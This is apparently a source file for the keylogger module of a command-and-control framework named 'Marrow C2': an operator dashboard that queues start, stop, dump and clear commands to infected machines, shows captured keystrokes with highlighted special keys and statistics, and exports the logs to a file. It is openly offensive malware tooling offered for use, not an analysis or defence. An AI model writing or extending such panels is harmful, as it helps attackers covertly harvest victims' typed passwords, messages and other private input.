<?php
// Marrow C2 - Keylogger Module
// Professional keystroke capture UI with live display
?>
<div id="kl-container" class="h-full flex flex-col bg-[#030712]">
    <!-- Toolbar -->
    <div class="h-14 bg-[#0a0f1a] border-b border-[#1e2433] flex items-center justify-between px-4">
        <div class="flex items-center gap-4">
            <span class="text-white font-medium text-lg">⌨️ Keylogger</span>
            <div id="kl-status" class="flex items-center gap-2 px-3 py-1.5 bg-[#1a1f2e] rounded-lg">
                <div id="kl-dot" class="w-2 h-2 rounded-full bg-gray-500"></div>
                <span id="kl-status-text" class="text-xs text-gray-400">Unknown</span>
            </div>
        </div>
        <div class="flex items-center gap-2">
            <button onclick="KL.start()" id="kl-start-btn"
                class="px-4 py-2 bg-[#10b981] hover:bg-[#0ea573] text-white rounded-lg text-sm font-medium flex items-center gap-2">
                <span>▶</span> Start
            </button>
            <button onclick="KL.stop()" id="kl-stop-btn"
                class="px-4 py-2 bg-[#ef4444] hover:bg-[#dc2626] text-white rounded-lg text-sm font-medium flex items-center gap-2">
                <span>⏹</span> Stop
            </button>
            <div class="w-px h-8 bg-[#1e2433] mx-1"></div>
            <button onclick="KL.dump()"
                class="px-4 py-2 bg-[#6366f1] hover:bg-[#5558e3] text-white rounded-lg text-sm font-medium flex items-center gap-2">
                <span>📥</span> Capture
            </button>
            <button onclick="KL.clear()"
                class="px-4 py-2 bg-[#1a1f2e] hover:bg-[#252b3d] text-gray-300 rounded-lg text-sm flex items-center gap-2">
                <span>🗑️</span> Clear
            </button>
            <button onclick="KL.export()"
                class="px-4 py-2 bg-[#1a1f2e] hover:bg-[#252b3d] text-gray-300 rounded-lg text-sm flex items-center gap-2">
                <span>💾</span> Export
            </button>
        </div>
    </div>

    <!-- Stats Bar -->
    <div class="h-10 bg-[#0a0f1a] border-b border-[#1e2433] flex items-center px-4 gap-6 text-xs">
        <div class="flex items-center gap-2">
            <span class="text-gray-500">Characters:</span>
            <span id="kl-chars" class="text-white font-medium">0</span>
        </div>
        <div class="flex items-center gap-2">
            <span class="text-gray-500">Words:</span>
            <span id="kl-words" class="text-white font-medium">0</span>
        </div>
        <div class="flex items-center gap-2">
            <span class="text-gray-500">Lines:</span>
            <span id="kl-lines" class="text-white font-medium">0</span>
        </div>
        <div class="flex-1"></div>
        <div class="flex items-center gap-2">
            <span class="text-gray-500">Last Updated:</span>
            <span id="kl-updated" class="text-gray-400">Never</span>
        </div>
    </div>

    <!-- Main Content -->
    <div class="flex-1 flex overflow-hidden">
        <!-- Keylog Output -->
        <div class="flex-1 flex flex-col">
            <div id="kl-output" class="flex-1 overflow-auto p-6 bg-black font-mono text-sm leading-relaxed">
                <div id="kl-placeholder" class="text-center py-16 text-gray-600">
                    <div class="text-6xl mb-6 opacity-30">⌨️</div>
                    <h3 class="text-xl text-gray-500 mb-2">Keylogger Ready</h3>
                    <p class="text-sm mb-4">Click "Start" to begin capturing keystrokes</p>
                    <p class="text-xs">Click "Capture" periodically to retrieve logged keys</p>
                </div>
                <pre id="kl-text" class="hidden text-[#10b981] whitespace-pre-wrap break-all"></pre>
            </div>
        </div>

        <!-- Side Panel - Recent Keys -->
        <div class="w-64 bg-[#0a0f1a] border-l border-[#1e2433] flex flex-col">
            <div class="px-4 py-3 border-b border-[#1e2433]">
                <span class="text-sm font-medium text-white">🔤 Special Keys</span>
            </div>
            <div id="kl-special" class="flex-1 overflow-auto p-3 space-y-1 text-xs font-mono">
                <div class="text-gray-600 text-center py-4">No special keys captured</div>
            </div>
            <div class="p-3 border-t border-[#1e2433]">
                <div class="text-[10px] text-gray-500 uppercase tracking-wider mb-2">Legend</div>
                <div class="grid grid-cols-2 gap-1 text-xs">
                    <div class="flex items-center gap-1"><span class="text-yellow-500">[Enter]</span></div>
                    <div class="flex items-center gap-1"><span class="text-red-500">[BS]</span></div>
                    <div class="flex items-center gap-1"><span class="text-blue-500">[Tab]</span></div>
                    <div class="flex items-center gap-1"><span class="text-purple-500">[Shift]</span></div>
                </div>
            </div>
        </div>
    </div>
</div>

<style>
    #kl-text {
        text-shadow: 0 0 10px rgba(16, 185, 129, 0.3);
    }

    .kl-key {
        display: inline-block;
        padding: 2px 6px;
        background: rgba(99, 102, 241, 0.2);
        border: 1px solid rgba(99, 102, 241, 0.3);
        border-radius: 4px;
        margin: 1px;
        font-size: 11px;
    }
</style>

<script>
    const KL = {
        data: '',
        active: false,
        specialKeys: [],

        start() {
            queueCommand('keylogger_start');
            this.setStatus(true);
        },

        stop() {
            queueCommand('keylogger_stop');
            this.setStatus(false);
        },

        dump() {
            queueCommand('keylogger_dump');
        },

        clear() {
            if (!confirm('Clear all captured keystrokes?')) return;
            queueCommand('keylogger_clear');
            this.data = '';
            this.render();
        },

        setStatus(active) {
            this.active = active;
            const dot = document.getElementById('kl-dot');
            const text = document.getElementById('kl-status-text');

            if (active) {
                dot.classList.remove('bg-gray-500');
                dot.classList.add('bg-[#10b981]', 'animate-pulse');
                text.textContent = 'Recording...';
                text.classList.remove('text-gray-400');
                text.classList.add('text-[#10b981]');
            } else {
                dot.classList.add('bg-gray-500');
                dot.classList.remove('bg-[#10b981]', 'animate-pulse');
                text.textContent = 'Stopped';
                text.classList.add('text-gray-400');
                text.classList.remove('text-[#10b981]');
            }
        },

        render() {
            const placeholder = document.getElementById('kl-placeholder');
            const textEl = document.getElementById('kl-text');

            if (!this.data) {
                placeholder.classList.remove('hidden');
                textEl.classList.add('hidden');
                return;
            }

            placeholder.classList.add('hidden');
            textEl.classList.remove('hidden');

            // Format the text with highlighted special keys
            let formatted = this.data
                .replace(/\[Enter\]/g, '<span class="text-yellow-500">[Enter]</span>\n')
                .replace(/\[Return\]/g, '<span class="text-yellow-500">[Enter]</span>\n')
                .replace(/\[BS\]/g, '<span class="text-red-500">[⌫]</span>')
                .replace(/\[Back\]/g, '<span class="text-red-500">[⌫]</span>')
                .replace(/\[Tab\]/g, '<span class="text-blue-500">[→|]</span>')
                .replace(/\[Shift\]/g, '<span class="text-purple-500">[⇧]</span>')
                .replace(/\[Control\]/g, '<span class="text-cyan-500">[Ctrl]</span>')
                .replace(/\[Alt\]/g, '<span class="text-orange-500">[Alt]</span>')
                .replace(/\[Capital\]/g, '<span class="text-pink-500">[Caps]</span>')
                .replace(/\[Space\]/g, ' ')
                .replace(/\[(.+?)\]/g, '<span class="text-gray-500">[$1]</span>');

            textEl.innerHTML = formatted;

            // Update stats
            const chars = this.data.replace(/\[.+?\]/g, '').length;
            const words = this.data.replace(/\[.+?\]/g, ' ').split(/\s+/).filter(w => w).length;
            const lines = (this.data.match(/\[Enter\]|\[Return\]/g) || []).length + 1;

            document.getElementById('kl-chars').textContent = chars;
            document.getElementById('kl-words').textContent = words;
            document.getElementById('kl-lines').textContent = lines;
            document.getElementById('kl-updated').textContent = new Date().toLocaleTimeString();

            // Extract special keys for side panel
            const specials = this.data.match(/\[.+?\]/g) || [];
            const specialCounts = {};
            specials.forEach(k => {
                specialCounts[k] = (specialCounts[k] || 0) + 1;
            });

            const specialEl = document.getElementById('kl-special');
            if (Object.keys(specialCounts).length > 0) {
                specialEl.innerHTML = Object.entries(specialCounts)
                    .sort((a, b) => b[1] - a[1])
                    .map(([key, count]) => `
                    <div class="flex items-center justify-between p-2 bg-[#1a1f2e] rounded-lg">
                        <span class="text-gray-300">${key}</span>
                        <span class="text-gray-500">${count}x</span>
                    </div>
                `).join('');
            }
        },

        handleResult(data) {
            try {
                const json = JSON.parse(data);

                if (json.status === 'started') {
                    this.setStatus(true);
                } else if (json.status === 'stopped' || json.status === 'cleared') {
                    if (json.status === 'cleared') {
                        this.data = '';
                        this.render();
                    }
                    if (json.status === 'stopped') {
                        this.setStatus(false);
                    }
                } else if (json.data !== undefined) {
                    this.data = json.data;
                    this.active = json.active;
                    this.setStatus(json.active);
                    this.render();
                }
            } catch (e) {
                // Raw text data
                this.data = data;
                this.render();
            }
        },

        export() {
            if (!this.data) {
                alert('No data to export');
                return;
            }

            const blob = new Blob([this.data], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `keylog_${Date.now()}.txt`;
            a.click();
            URL.revokeObjectURL(url);
        }
    };

    // Auto-refresh status
    setTimeout(() => queueCommand('keylogger_dump'), 500);
</script>